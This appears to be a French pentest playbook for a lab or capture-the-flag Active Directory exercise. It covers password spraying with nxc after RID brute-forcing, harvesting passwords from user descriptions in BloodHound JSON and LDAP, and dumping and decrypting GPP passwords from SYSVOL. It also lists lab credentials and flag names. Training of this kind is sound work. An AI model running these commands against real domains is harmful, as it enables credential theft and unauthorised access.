# Playbook 04 — LDAP secrets, spray, SYSVOL / GPP

> Runbook étapes 36–45 | Challenges : *Décrivez précisément*, *secret trop partagé*, *goût par défaut* (spray)

## Variables

```bash
export DC_IP=10.13.37.42
export SUBNET=10.13.37.0/24
export USER=pentester
export PASS='Password123!'
export DEFAULT_PASS='C3L3stin4!Us3r'
```

---

### Étape 1 — Spray mot de passe par défaut (depuis notice.pdf)

```bash
nxc smb 10.13.37.42 -u 'pentester' -p 'Password123!' --rid-brute 2>/dev/null | grep SidTypeUser | awk -F'\\' '{print $2}' | awk '{print $1}' | sort -u > users.txt
nxc smb 10.13.37.0/24 -u users.txt -p 'C3L3stin4!Us3r' --continue-on-success
```

**Résultat attendu (TP blanc)** :
- `a.nozer` + `(admin)` sur **WK-123**
- `d.folt` valide sans admin

**Journal** : noter comptes et machines admin.

---

### Étape 2 — Mots de passe dans description (BloodHound JSON)

```bash
grep -i '"description"' *users*.json | grep -v '""'
```

**Comptes TP blanc** :
| User | Password (description) |
|------|----------------------|
| k.cedepte | R3m0t3Pr1v1l3g35@H4nd! |
| d.scrip | ONeT0uGhP4ssW0rdT0CrAcK! |
| k.brown | L3tsMak3S0m3C00k1es!! |
| m.jones | P4ssW0rd1zS3cur3&L0n9 |

**Journal** : flag *Décrivez précisément…*

---

### Étape 3 — Tester k.cedepte (délégation plus tard)

```bash
nxc smb 10.13.37.0/24 -u 'k.cedepte' -p 'R3m0t3Pr1v1l3g35@H4nd!' --continue-on-success
```

**Résultat attendu** : `[+]` partout, pas de `(Pwn3d!)` → passer à [07-delegation-constrained.md](07-delegation-constrained.md).

---

### Étape 4 — SYSVOL lisible (secret trop partagé)

```bash
nxc smb 10.13.37.42 -u 'pentester' -p 'Password123!' --shares
nxc smb 10.13.37.42 -u 'pentester' -p 'Password123!' -M gpp_password
```

**Résultat attendu** : mots de passe GPP historiques (Groups.xml) si présents.

**Si trouvé** :

```bash
gpp-decrypt "CHIFFRE_EXTRAIT"
```

**Journal** : flag *Un secret trop partagé n'est plus secret*.

---

### Étape 5 — Parcourir SYSVOL manuellement

```bash
smbclient //10.13.37.42/SYSVOL -U 'pentester%Password123!' -c 'recurse; ls'
```

---

### Étape 6 — ldapsearch description (alternative CLI)

```bash
ldapsearch -x -H ldap://10.13.37.42 -D "pentester@celestina.shop" -w 'Password123!' -b "DC=celestina,DC=shop" "(objectClass=user)" description | grep -i description
```
